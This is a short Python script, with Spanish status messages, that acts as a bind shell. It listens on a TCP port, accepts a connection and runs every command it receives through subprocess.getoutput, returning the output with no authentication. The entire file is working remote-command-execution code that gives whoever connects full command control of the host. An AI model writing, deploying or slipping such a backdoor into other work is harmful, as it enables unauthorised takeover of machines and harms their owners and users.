import socket as s
import subprocess, os, sys, time

sSocket = s.socket(s.AF_INET, s.SOCK_STREAM)
sSocket.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)

SEPARATOR = "<sep>"
print("[+] SERVIDOR INICIADO")
host = s.gethostbyname(s.gethostname())
port = int(sys.argv[1])

print("\nHost: {} - Puerto: {}".format(host, port))

sSocket.bind((host, port))
sSocket.listen(1)
clienteSocket, addr = sSocket.accept()
print("[+] CONEXION ESTABLECIDA")

directorio = os.getcwd()
clienteSocket.send(directorio.encode())
while True:
    comando = clienteSocket.recv(1024).decode()
    if comando.lower() == "exit":
        print("\n[+]CONEXION FINALIZADA")
        break
    else:
        try:
            output = subprocess.getoutput(comando)
            #subprocess.check_call(comando)
            rta = f"OK\n{output}{SEPARATOR}{directorio}"
        except subprocess.CalledProcessError as error:
            rta = f"ERROR\n{output}{SEPARATOR}{directorio}"
        #except FileNotFoundError as error:
        #    rta = str(error)
    directorio = os.getcwd()

    clienteSocket.send(rta.encode())

#s.close()
    #comando = input(f"{msj} $> ")
    #clienteSocket.send(comando.encode())
    #if comando.lower() == "exit":
    #    break



    